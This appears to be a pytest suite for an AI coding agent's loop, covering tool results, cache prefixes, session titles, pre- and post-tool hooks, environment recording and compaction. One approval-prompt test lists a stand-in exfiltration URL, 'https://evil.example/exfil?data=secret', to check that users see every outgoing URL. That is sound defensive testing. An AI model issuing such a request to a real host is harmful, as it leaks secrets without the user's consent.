"""Agent loop behaviour, driven by the scripted fake provider."""

from __future__ import annotations

import asyncio
from dataclasses import replace
from pathlib import Path
from typing import Any

import pytest

from hx.config import load_settings
from hx.core.context import ContextBuilder
from hx.core.events import EventBus, TextDelta, ToolCallFinished, TurnFinished
from hx.core.lateinject import Injection, InjectionRegistry
from hx.core.loop import AgentLoop
from hx.core.messages import StopReason, ToolUseBlock
from hx.core.session import new_session
from hx.core.title import TITLE_MAX_TOKENS
from hx.core.usage import TurnUsage
from hx.hooks.engine import HookEngine
from hx.hooks.spec import HookCommand, HookEvent
from hx.providers.base import StreamDelta, StreamEnd, StreamItem
from hx.providers.fake import FakeProvider, text_turn, tool_turn
from hx.providers.models import ModelRegistry
from hx.tools.base import Tool, ToolContext, ToolResult
from hx.tools.registry import ToolRegistry


class EchoTool(Tool):
    name = "Echo"
    description = "echo"
    mutating = False

    def schema(self) -> dict[str, Any]:
        return {"type": "object", "properties": {"text": {"type": "string"}}, "required": ["text"]}

    async def run(self, params: dict[str, Any], ctx: ToolContext) -> ToolResult:
        return ToolResult(content=params["text"], summary="echoed")


class Harness:
    """A loop wired to a scripted provider, plus the events it published."""

    def __init__(self, provider: FakeProvider, loop: AgentLoop, bus: EventBus) -> None:
        self.provider = provider
        self.loop = loop
        self.bus = bus
        self.events: list[Any] = []
        self._task: asyncio.Task[None] | None = None

    async def __aenter__(self) -> Harness:
        async def consume() -> None:
            async for event in self.bus.subscribe():
                self.events.append(event)

        self._task = asyncio.create_task(consume())
        await asyncio.sleep(0)
        return self

    async def __aexit__(self, *exc: object) -> None:
        await asyncio.sleep(0.05)
        self.bus.close()
        if self._task is not None:
            await self._task


def build_loop(
    script: list[list[StreamItem]],
    tmp_path: Path,
    tools: ToolRegistry | None = None,
    title: str | None = "scripted session",
    hooks: HookEngine | None = None,
) -> Harness:
    provider = FakeProvider(script)
    bus = EventBus()
    session = new_session(tmp_path, "anthropic/claude-sonnet-4.5")
    # An already-named session does not ask the model for a name, so the script
    # a test writes is exactly the turns it gets. The naming call itself is
    # exercised in the tests that pass ``title=None``.
    if title:
        session.set_title(title)
    loop = AgentLoop(
        provider=provider,
        session=session,
        tools=tools or ToolRegistry(),
        permissions=None,
        context=ContextBuilder("sys", tmp_path, keep_recent_turns=2),
        compactor=None,
        injections=InjectionRegistry(),
        bus=bus,
        settings=load_settings(tmp_path),
        model_info=ModelRegistry().get_or_default("anthropic/claude-sonnet-4.5"),
        hooks=hooks,
    )
    return Harness(provider, loop, bus)


@pytest.fixture()
def registry() -> ToolRegistry:
    registry = ToolRegistry()
    registry.register(EchoTool())
    return registry


async def test_loop_stops_on_text_only_turn(hx_home: Path, tmp_path: Path) -> None:
    async with build_loop([text_turn("done")], tmp_path) as h:
        result = await h.loop.run("hello")

    assert result.stop_reason is StopReason.END_TURN
    assert len(h.provider.requests) == 1
    assert h.loop.session.messages[-1].text() == "done"


async def test_tool_results_are_appended_before_the_next_turn(
    hx_home: Path, tmp_path: Path, registry: ToolRegistry
) -> None:
    script = [tool_turn("Echo", {"text": "pong"}), text_turn("ok")]
    async with build_loop(script, tmp_path, registry) as h:
        await h.loop.run("ping")

    roles = [m.role for m in h.loop.session.messages]
    assert roles == ["user", "assistant", "user", "assistant"]
    assert h.loop.session.messages[2].tool_results()[0].content == "pong"


async def test_prefix_stays_warm_across_a_multi_turn_run(
    hx_home: Path, tmp_path: Path, registry: ToolRegistry
) -> None:
    """The whole point of the caching design: every turn reuses one prefix."""
    script = [tool_turn("Echo", {"text": "x"}), text_turn("ok")]
    async with build_loop(script, tmp_path, registry) as h:
        await h.loop.run("go")

    fingerprints = h.provider.prefix_fingerprints()
    assert len(fingerprints) == 2
    assert len(set(fingerprints)) == 1


async def test_late_injections_do_not_disturb_the_prefix(
    hx_home: Path, tmp_path: Path, registry: ToolRegistry
) -> None:
    """A reminder that changes every turn must not show up above a breakpoint."""
    script = [tool_turn("Echo", {"text": "x"}), text_turn("ok")]
    async with build_loop(script, tmp_path, registry) as h:
        counter = iter(range(100))
        h.loop.injections.register(
            "counter", lambda: Injection(source="counter", text=f"tick {next(counter)}")
        )
        await h.loop.run("go")

    assert len(set(h.provider.prefix_fingerprints())) == 1
    last = h.provider.requests[-1].context.messages[-1]
    assert "tick" in last.text()


async def test_unknown_tool_returns_an_error_result_not_an_exception(
    hx_home: Path, tmp_path: Path
) -> None:
    """A refusal must reach the model so it can adapt, not kill the turn."""
    script = [tool_turn("Nope", {}), text_turn("recovered")]
    async with build_loop(script, tmp_path) as h:
        result = await h.loop.run("go")

    assert result.stop_reason is StopReason.END_TURN
    tool_result = h.loop.session.messages[2].tool_results()[0]
    assert tool_result.is_error
    assert "Unknown tool" in tool_result.content


async def test_failing_tool_becomes_an_error_result(hx_home: Path, tmp_path: Path) -> None:
    class Boom(Tool):
        name = "Boom"
        description = "explodes"

        def schema(self) -> dict[str, Any]:
            return {"type": "object", "properties": {}}

        async def run(self, params: dict[str, Any], ctx: ToolContext) -> ToolResult:
            raise RuntimeError("kaboom")

    registry = ToolRegistry()
    registry.register(Boom())
    script = [tool_turn("Boom", {}), text_turn("handled")]
    async with build_loop(script, tmp_path, registry) as h:
        await h.loop.run("go")

    assert "kaboom" in h.loop.session.messages[2].tool_results()[0].content
    assert any(isinstance(e, ToolCallFinished) and e.is_error for e in h.events)


async def test_usage_and_events_are_published(
    hx_home: Path, tmp_path: Path, registry: ToolRegistry
) -> None:
    usage = TurnUsage(input_tokens=100, output_tokens=20, cache_read_tokens=900, cost_usd=0.01)
    async with build_loop([text_turn("hi", usage=usage)], tmp_path, registry) as h:
        await h.loop.run("go")

    assert h.loop.session.usage.total_cache_read == 900
    assert h.loop.session.usage.total_cost_usd == 0.01
    assert any(isinstance(e, TextDelta) for e in h.events)
    assert sum(isinstance(e, TurnFinished) for e in h.events) == 1


async def test_mutating_tools_run_serially_in_emission_order(hx_home: Path, tmp_path: Path) -> None:
    order: list[str] = []

    class Recorder(Tool):
        description = "records"
        mutating = True

        def __init__(self, name: str) -> None:
            self.name = name

        def schema(self) -> dict[str, Any]:
            return {"type": "object", "properties": {}}

        async def run(self, params: dict[str, Any], ctx: ToolContext) -> ToolResult:
            order.append(f"start:{self.name}")
            await asyncio.sleep(0.01)
            order.append(f"end:{self.name}")
            return ToolResult(content="ok")

    registry = ToolRegistry()
    registry.register(Recorder("A"))
    registry.register(Recorder("B"))

    script = [
        [
            StreamDelta(tool_use_id="1", tool_name="A", tool_input_json="{}"),
            StreamDelta(tool_use_id="2", tool_name="B", tool_input_json="{}"),
            StreamEnd(stop_reason=StopReason.TOOL_USE),
        ],
        text_turn("done"),
    ]
    async with build_loop(script, tmp_path, registry) as h:
        await h.loop.run("go")

    assert order == ["start:A", "end:A", "start:B", "end:B"]


async def test_permission_events_announce_only_what_actually_prompts(
    hx_home: Path, tmp_path: Path
) -> None:
    """Publishing on every check made headless runs report a permission prompt
    for calls that were auto-allowed and never asked about."""
    from hx.config import PermissionMode
    from hx.core.events import PermissionRequested
    from hx.permissions.engine import PermissionAnswer, PermissionEngine, PermissionRequest

    class Writer(Tool):
        name = "Write"
        description = "writes"
        mutating = True

        def schema(self) -> dict[str, Any]:
            return {"type": "object", "properties": {}}

        async def run(self, params: dict[str, Any], ctx: ToolContext) -> ToolResult:
            return ToolResult(content="ok")

    registry = ToolRegistry()
    registry.register(EchoTool())
    registry.register(Writer())

    async def asker(request: PermissionRequest) -> PermissionAnswer:
        return PermissionAnswer(allowed=True)

    script = [
        [
            StreamDelta(tool_use_id="1", tool_name="Echo", tool_input_json='{"text": "hi"}'),
            StreamEnd(stop_reason=StopReason.TOOL_USE),
        ],
        [
            StreamDelta(tool_use_id="2", tool_name="Write", tool_input_json="{}"),
            StreamEnd(stop_reason=StopReason.TOOL_USE),
        ],
        text_turn("done"),
    ]
    async with build_loop(script, tmp_path, registry) as h:
        h.loop.permissions = PermissionEngine(PermissionMode.DEFAULT, [], tmp_path, asker=asker)
        await h.loop.run("go")

    announced = [e.tool_name for e in h.events if isinstance(e, PermissionRequested)]
    assert announced == ["Write"], "the read-only Echo call never stopped for approval"


async def test_a_finished_turn_names_the_session(hx_home: Path, tmp_path: Path) -> None:
    """Without this, /resume lists timestamps instead of work."""
    script = [text_turn("done"), text_turn("Parser bug fix")]
    async with build_loop(script, tmp_path, title=None) as h:
        await h.loop.run("fix the parser")

    assert h.loop.session.meta.title == "Parser bug fix"
    assert h.provider.requests[-1].max_tokens == TITLE_MAX_TOKENS


async def test_a_session_is_named_once(hx_home: Path, tmp_path: Path) -> None:
    script = [text_turn("done"), text_turn("Parser bug fix"), text_turn("done again")]
    async with build_loop(script, tmp_path, title=None) as h:
        await h.loop.run("fix the parser")
        await h.loop.run("thanks")

    assert h.loop.session.meta.title == "Parser bug fix"
    assert len(h.provider.requests) == 3  # two turns, one naming call


async def test_naming_falls_back_to_the_first_message(hx_home: Path, tmp_path: Path) -> None:
    """The script runs out before the naming call, so the provider errors."""
    async with build_loop([text_turn("done")], tmp_path, title=None) as h:
        result = await h.loop.run("fix the parser")

    assert result.stop_reason is StopReason.END_TURN
    assert result.error is None
    assert h.loop.session.meta.title == "fix the parser"


async def test_the_naming_call_is_counted_in_the_ledger(hx_home: Path, tmp_path: Path) -> None:
    script = [
        text_turn("done", usage=TurnUsage(input_tokens=10, output_tokens=5)),
        text_turn("Parser bug fix", usage=TurnUsage(input_tokens=20, output_tokens=4)),
    ]
    async with build_loop(script, tmp_path, title=None) as h:
        await h.loop.run("fix the parser")

    assert h.loop.session.usage.total_input == 30
    assert h.loop.session.usage.total_output == 9


async def test_a_subagent_session_is_not_named(hx_home: Path, tmp_path: Path) -> None:
    """Subagent transcripts never appear in /resume, so naming them is spend
    with nothing behind it."""
    async with build_loop([text_turn("done")], tmp_path, title=None) as h:
        h.loop.origin = "reviewer subagent"
        await h.loop.run("fix the parser")

    assert h.loop.session.meta.title is None
    assert len(h.provider.requests) == 1


async def test_a_title_model_override_is_used(hx_home: Path, tmp_path: Path) -> None:
    async with build_loop([text_turn("done"), text_turn("Named")], tmp_path, title=None) as h:
        h.loop.settings = load_settings(tmp_path, {"models": {"title_model": "cheap/model"}})
        await h.loop.run("fix the parser")

    assert h.provider.requests[-1].model == "cheap/model"
    assert h.provider.requests[0].model == "anthropic/claude-sonnet-4.5"


async def test_closing_the_session_renames_it_for_what_it_became(
    hx_home: Path, tmp_path: Path
) -> None:
    """A name from the first exchange describes an opening question, not a session.

    ``/resume`` is picked from these names, so the one worth keeping is the one
    written when the work is done.
    """
    script = [
        text_turn("done"),
        text_turn("Parser bug fix"),
        text_turn("done again"),
        text_turn("Parser rewrite and tests"),
    ]
    async with build_loop(script, tmp_path, title=None) as h:
        await h.loop.run("fix the parser")
        assert h.loop.session.meta.title == "Parser bug fix"
        await h.loop.run("now rewrite it")

        await h.loop.retitle_session()

    assert h.loop.session.meta.title == "Parser rewrite and tests"


async def test_closing_an_unchanged_session_does_not_spend_a_call(
    hx_home: Path, tmp_path: Path
) -> None:
    """Nothing was said after the name was written, so there is nothing to rename."""
    script = [text_turn("done"), text_turn("Parser bug fix")]
    async with build_loop(script, tmp_path, title=None) as h:
        await h.loop.run("fix the parser")
        before = len(h.provider.requests)

        await h.loop.retitle_session()

    assert h.loop.session.meta.title == "Parser bug fix"
    assert len(h.provider.requests) == before


async def test_a_failed_rename_keeps_the_name_it_had(hx_home: Path, tmp_path: Path) -> None:
    """The script runs out, so the naming call raises. Losing the old name over
    that would make closing a session worse than not closing it."""
    script = [text_turn("done"), text_turn("Parser bug fix"), text_turn("done again")]
    async with build_loop(script, tmp_path, title=None) as h:
        await h.loop.run("fix the parser")
        await h.loop.run("now rewrite it")

        await h.loop.retitle_session()

    assert h.loop.session.meta.title == "Parser bug fix"


async def test_a_subagent_session_is_not_renamed_on_close(hx_home: Path, tmp_path: Path) -> None:
    async with build_loop([text_turn("done")], tmp_path, title=None) as h:
        h.loop.origin = "reviewer subagent"
        await h.loop.run("fix the parser")

        await h.loop.retitle_session()

    assert h.loop.session.meta.title is None
    assert len(h.provider.requests) == 1


# --- hooks ------------------------------------------------------------------


def _hooks(tmp_path: Path, event: HookEvent, *commands: HookCommand) -> HookEngine:
    return HookEngine(hooks={event: list(commands)}, cwd=tmp_path, session_id="s1")


async def test_pre_tool_use_hook_blocks_the_call(
    hx_home: Path, tmp_path: Path, registry: ToolRegistry
) -> None:
    """The tool never runs and the model is told why."""
    hooks = _hooks(
        tmp_path,
        HookEvent.PRE_TOOL_USE,
        HookCommand("echo 'Echo is off limits' >&2; exit 2", timeout=10),
    )
    script = [tool_turn("Echo", {"text": "hi"}), text_turn("understood")]
    async with build_loop(script, tmp_path, registry, hooks=hooks) as h:
        await h.loop.run("go")

    results = [m for m in h.loop.session.messages if m.tool_results()]
    block = results[0].tool_results()[0]
    assert block.is_error
    assert "Echo is off limits" in block.content
    assert "hi" not in block.content


async def test_pre_tool_use_hook_can_rewrite_the_input(
    hx_home: Path, tmp_path: Path, registry: ToolRegistry
) -> None:
    payload = '{"updatedInput": {"text": "rewritten"}}'
    hooks = _hooks(tmp_path, HookEvent.PRE_TOOL_USE, HookCommand(f"echo '{payload}'", timeout=10))
    script = [tool_turn("Echo", {"text": "original"}), text_turn("ok")]
    async with build_loop(script, tmp_path, registry, hooks=hooks) as h:
        await h.loop.run("go")

    results = [m for m in h.loop.session.messages if m.tool_results()]
    assert results[0].tool_results()[0].content == "rewritten"


async def test_post_tool_use_hook_appends_context(
    hx_home: Path, tmp_path: Path, registry: ToolRegistry
) -> None:
    payload = '{"additionalContext": "note: suite is red"}'
    hooks = _hooks(tmp_path, HookEvent.POST_TOOL_USE, HookCommand(f"echo '{payload}'", timeout=10))
    script = [tool_turn("Echo", {"text": "hi"}), text_turn("ok")]
    async with build_loop(script, tmp_path, registry, hooks=hooks) as h:
        await h.loop.run("go")

    results = [m for m in h.loop.session.messages if m.tool_results()]
    content = results[0].tool_results()[0].content
    assert content.startswith("hi")
    assert "note: suite is red" in content


async def test_user_prompt_submit_hook_can_refuse_the_turn(hx_home: Path, tmp_path: Path) -> None:
    hooks = _hooks(
        tmp_path,
        HookEvent.USER_PROMPT_SUBMIT,
        HookCommand("echo 'not now' >&2; exit 2", timeout=10),
    )
    async with build_loop([text_turn("unreachable")], tmp_path, hooks=hooks) as h:
        result = await h.loop.run("go")

    assert result.stop_reason is StopReason.ERROR
    assert result.error == "not now"
    assert h.provider.requests == []
    assert h.loop.session.messages == []


async def test_a_broken_hook_does_not_block_the_call(
    hx_home: Path, tmp_path: Path, registry: ToolRegistry
) -> None:
    """A typo in a hook is a notice, not a wedged session."""
    hooks = _hooks(tmp_path, HookEvent.PRE_TOOL_USE, HookCommand("exit 9", timeout=10))
    script = [tool_turn("Echo", {"text": "hi"}), text_turn("ok")]
    async with build_loop(script, tmp_path, registry, hooks=hooks) as h:
        await h.loop.run("go")

    results = [m for m in h.loop.session.messages if m.tool_results()]
    assert results[0].tool_results()[0].content == "hi"
    assert any("hook" in getattr(e, "message", "") for e in h.events)


async def test_stop_hook_fires_when_the_turn_ends(hx_home: Path, tmp_path: Path) -> None:
    marker = tmp_path / "stopped"
    hooks = _hooks(tmp_path, HookEvent.STOP, HookCommand(f"touch {marker}", timeout=10))
    async with build_loop([text_turn("done")], tmp_path, hooks=hooks) as h:
        await h.loop.run("go")

    assert marker.exists()


async def test_stop_hook_fires_when_the_turn_falls_over(hx_home: Path, tmp_path: Path) -> None:
    """The exits nobody planned are the ones a cleanup hook is needed on."""
    marker = tmp_path / "stopped"
    hooks = _hooks(tmp_path, HookEvent.STOP, HookCommand(f"touch {marker}", timeout=10))
    # An empty script makes FakeProvider raise ProviderError on the first turn.
    async with build_loop([], tmp_path, hooks=hooks) as h:
        result = await h.loop.run("go")

    assert result.stop_reason is StopReason.ERROR
    assert marker.exists()


async def test_subagents_inherit_the_parent_hooks(hx_home: Path, tmp_path: Path) -> None:
    """A guard that Task could bypass would not be a guard."""
    from hx.agents.definitions import AgentDefinition
    from hx.agents.subagent import SubagentRunner

    hooks = _hooks(tmp_path, HookEvent.PRE_TOOL_USE, HookCommand("exit 2", timeout=10))
    runner = SubagentRunner(
        definitions={"probe": AgentDefinition(name="probe", description="d", system_prompt="s")},
        provider=FakeProvider([]),
        tools=ToolRegistry(),
        permissions=None,
        bus=EventBus(),
        settings=load_settings(tmp_path),
        hooks=hooks,
    )
    child = runner._build_loop(runner.definitions["probe"], "sub-1")
    assert child.hooks is hooks


async def test_the_first_call_records_the_environment(
    hx_home: Path, tmp_path: Path, registry: ToolRegistry
) -> None:
    """What the model was told is recorded next to what it said.

    Without it a trace of a finished session can show every turn and still not
    say which prompt or which tools produced them.
    """
    from hx.core.session import load_session

    async with build_loop([text_turn("done")], tmp_path, registry) as h:
        await h.loop.run("hello")

    recorded = load_session(h.loop.session.meta.session_id).environment
    assert recorded is not None
    assert recorded.system_prompt == "sys"
    assert [tool["name"] for tool in recorded.tools] == ["Echo"]


async def test_the_environment_is_written_once_per_session(
    hx_home: Path, tmp_path: Path, registry: ToolRegistry
) -> None:
    """Every turn assembles a request; only the first writes a copy of every
    tool schema into the transcript."""
    from hx.paths import session_transcript_file

    script = [tool_turn("Echo", {"text": "x"}), text_turn("ok")]
    async with build_loop(script, tmp_path, registry) as h:
        await h.loop.run("ping")
        session_id = h.loop.session.meta.session_id

    lines = session_transcript_file(session_id).read_text().splitlines()
    assert sum(1 for line in lines if '"kind": "environment"' in line) == 1


async def test_the_recorded_tools_are_not_this_turn_s_allowed_subset(
    hx_home: Path, tmp_path: Path, registry: ToolRegistry
) -> None:
    """An active skill narrows what the model sees for a turn.

    The session ran with the whole registry, so that is what a trace has to
    name - a list recorded from one restricted turn would understate it.
    """

    class OnlySkill:
        def tool_allowlist(self) -> set[str]:
            return {"Skill"}

        def prompt_sections(self) -> list[Any]:
            return []

    async with build_loop([text_turn("done")], tmp_path, registry) as h:
        h.loop.active_skills = OnlySkill()  # type: ignore[assignment]
        await h.loop.run("hello")
        recorded = h.loop.session.environment
        assembled = h.loop.last_context

    assert assembled is not None
    assert "Echo" not in {tool["name"] for tool in assembled.tools}, "the skill did not narrow"
    assert recorded is not None
    assert [tool["name"] for tool in recorded.tools] == ["Echo"]


async def test_only_the_first_call_renders_the_whole_registry(
    hx_home: Path, tmp_path: Path, registry: ToolRegistry
) -> None:
    """The environment is recorded once, so it is built once.

    ``record_environment`` returns early on every later call, but the argument
    renders every schema in the registry to get there. A long session would do
    that hundreds of times to throw the result away.

    A skill narrows the per-turn call to a subset, which is what tells the two
    call sites apart: only the environment asks for the registry entire.
    """

    class OnlySkill:
        def tool_allowlist(self) -> set[str]:
            return {"Skill"}

        def prompt_sections(self) -> list[Any]:
            return []

    script = [tool_turn("Echo", {"text": "x"}), tool_turn("Echo", {"text": "y"}), text_turn("ok")]
    async with build_loop(script, tmp_path, registry) as h:
        h.loop.active_skills = OnlySkill()  # type: ignore[assignment]
        whole = 0
        original = h.loop.tools.schemas

        def counting(allowed: set[str] | None = None) -> list[dict[str, Any]]:
            nonlocal whole
            if allowed is None:
                whole += 1
            return original(allowed)

        h.loop.tools.schemas = counting  # type: ignore[method-assign]
        await h.loop.run("ping")

    assert len(h.loop.session.usage.turns) == 3, "the turn did not make three calls"
    assert whole == 1, f"the whole registry was rendered {whole} times across three calls"


# --- what the approval prompt actually shows -------------------------------


def test_a_list_argument_is_spelled_out_in_the_approval() -> None:
    """``WebFetch`` asked the user to approve ``urls=[2 items]``.

    Which URLs are about to leave the machine is the entire question, and that
    rendering answered it with a number. The one-line *header* may collapse a
    list; the detail the user reads before pressing yes may not.
    """
    from hx.core.loop import _permission_detail

    call = ToolUseBlock(
        id="1",
        name="WebFetch",
        input={
            "urls": ["https://good.example/a", "https://evil.example/exfil?data=secret"],
            "extract_depth": "basic",
        },
    )
    detail, kind = _permission_detail(call)

    assert kind == "text"
    assert "https://good.example/a" in detail
    assert "https://evil.example/exfil?data=secret" in detail
    assert "[2 items]" not in detail


def test_a_very_long_list_is_truncated_with_a_count() -> None:
    """A prompt the user has to scroll is a prompt they stop reading."""
    from hx.core.loop import _MAX_LISTED, _permission_detail

    urls = [f"https://example.com/{index}" for index in range(_MAX_LISTED + 5)]
    detail, _ = _permission_detail(ToolUseBlock(id="1", name="WebFetch", input={"urls": urls}))

    assert f"https://example.com/{_MAX_LISTED - 1}" in detail
    assert f"https://example.com/{_MAX_LISTED}" not in detail
    assert "and 5 more" in detail


def test_the_one_line_header_still_collapses_a_list() -> None:
    """The header is a header: it has a line to work with, not a screen."""
    from hx.core.loop import _brief

    assert _brief({"urls": ["a", "b", "c"]}) == "urls=[3 items]"


async def test_an_automatic_compaction_with_nothing_to_do_is_not_announced(
    hx_home: Path, tmp_path: Path
) -> None:
    """A threshold that has been crossed stays crossed.

    When the split has nothing behind it, the automatic path used to announce a
    compaction, run it, and report that nothing happened - once per turn for
    the rest of the session. The check is pure, so a turn that cannot compact
    costs neither a provider call nor a line of UI.
    """
    from hx.core.compaction import Compactor
    from hx.core.events import CompactionFinished, CompactionStarted

    # Always over the threshold, but only two messages behind the split.
    compactor = Compactor(provider=None, model="m", keep_recent_turns=6)

    async with build_loop(
        [tool_turn("Echo", {"text": "one"}), text_turn("done")],
        tmp_path,
        tools=_echo_registry(),
    ) as h:
        h.loop.compactor = compactor
        h.loop.settings = replace(
            h.loop.settings, context=replace(h.loop.settings.context, compact_at=0.0001)
        )
        h.loop.session.usage.context_tokens = 999_999
        h.loop.session.usage.context_window = 1_000_000
        await h.loop.run("go")

    announced = [e for e in h.events if isinstance(e, CompactionStarted | CompactionFinished)]
    assert announced == []


async def test_an_explicit_compaction_still_reports_when_there_is_nothing_to_do(
    hx_home: Path, tmp_path: Path
) -> None:
    """Somebody who types ``/compact`` is owed the answer either way."""
    from hx.core.compaction import Compactor
    from hx.core.events import CompactionFinished, CompactionStarted

    async with build_loop([text_turn("done")], tmp_path) as h:
        h.loop.compactor = Compactor(provider=None, model="m", keep_recent_turns=6)
        assert await h.loop.compact(reason="requested") is False

    kinds = {type(e) for e in h.events}
    assert CompactionStarted in kinds
    assert CompactionFinished in kinds


def _echo_registry() -> ToolRegistry:
    registry = ToolRegistry()
    registry.register(EchoTool())
    return registry
